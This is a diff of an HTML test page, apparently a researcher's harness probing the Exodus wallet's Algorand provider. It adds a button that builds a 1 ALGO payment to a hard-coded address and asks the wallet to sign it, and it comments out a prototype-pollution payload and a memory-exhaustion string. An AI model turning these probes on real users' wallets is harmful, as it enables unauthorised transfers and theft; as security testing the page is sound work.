@@ -4,12 +4,12 @@
         <link rel="shortcut icon" type="image/xss+svg" href="xss.svg"/>
         <!--<script src="chrome-extension://llekelocgcbelmdpkdjigdgnckkobioc/algorand-provider.js">ay no</script>-->
     </head>
-    <body style="background: rgb(107,31,147); background: radial-gradient(circle, rgba(110,140,200,1) 0%, rgba(250,250,250,1) 35%, rgba(250,1,5,1) 100%);">
+    <body style="background: rgb(107,31,147); background: radial-gradient(circle, rgba(110,190,200,1) 0%, rgba(250,250,250,1) 35%, rgba(50,1,5,1) 100%);">
         <script type="module">
             // PROTOTYPE POLLUTION
-            window.exodus = {}
-            window.exodus.p = {}
-            window.exodus.p["__proto__"]["isConnected"] = true
+            //window.exodus = {}
+            //window.exodus.p = {}
+            //window.exodus.p["__proto__"]["isConnected"] = true
 
             //var payload = '\uD83D\uDC04'.repeat(10000000);
             //console.log("[*] " + payload);
@@ -32,6 +32,21 @@
                 });
 
                 myEventDispatcher.doSomething();
+            }
+
+            function transaction() {
+                const algodClient = new algosdk.Algodv2(/* ... */)
+                const suggestedParams = await algodClient.getTransactionParams().do()
+                const transaction = algosdk.makePaymentTxnWithSuggestedParamsFromObject({
+                    suggestedParams,
+                    from: window.exodus.algorand.address,
+                    to: 'RN6KHCDQEH4VONJWXQ4QULCAX5R2NM2DFDCVYTU3ZTKGFUQGFS5NTPTHJY',
+                    amount: 1000000, // Equals 1 ALGO
+                })
+
+                const signedTransactions = await window.exodus.algorand.signTransaction([
+                    transaction.toByte(),
+                ])
             }
 
             function prot_pollute() {
@@ -82,6 +97,7 @@
         <h2>Can we hack x0-w?</h2>
         <input type="button" value="algo_connect" onclick="algo_connect()" />
         <input type="button" value="accept_connection" onclick="accept_connection()" />
+        <input type="button" value="transaction" onclick="transaction()" />
         <input type="button" value="prot_pollute" onclick="prot_pollute()" />
         <input type="button" value="hack" onclick="hack()" />
         <input type="button" value="hack2" onclick="hack2()" />
